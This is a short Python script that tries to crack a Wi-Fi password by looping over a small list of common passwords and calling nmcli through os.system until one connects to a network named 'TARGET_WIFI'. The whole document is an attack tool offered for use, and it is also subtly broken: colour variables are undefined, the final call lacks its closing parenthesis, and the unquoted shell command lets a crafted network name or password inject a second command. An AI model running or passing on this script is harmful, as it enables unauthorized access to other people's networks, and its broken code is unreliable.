import os

def brute_force_wifi(ssid, wordlist):
    for password in wordlist:
        command = f"nmcli dev wifi connect {ssid} password {password}"
        result = os.system(command)

        if result == 0:
            print(f"{RED}[CRACKED]{RESET} Wi-Fi password found: {password}")
            return
        else:
            print(f"{YELLOW}[FAILED]{RESET} Tried: {password}")

passwords = ["12345678", "password", "qwerty", "letmein", "admin"]
brute_force_wifi("TARGET_WIFI", passwords
